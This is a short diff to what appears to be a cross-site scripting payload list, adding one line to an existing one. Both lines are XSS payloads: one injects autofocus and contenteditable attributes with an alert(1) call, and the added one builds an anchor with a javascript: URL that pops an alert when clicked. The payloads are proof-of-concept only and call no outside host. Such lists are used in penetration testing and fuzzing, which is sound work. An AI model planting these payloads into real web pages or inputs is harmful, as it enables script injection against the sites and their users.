@@ -1,1 +1,2 @@
 parameter=1?alert(1):1+AutoFocus+ContentEditable%3E
+"<a%20href="javascript:alert('IamRasave')">XSS-Click</00>--%20/
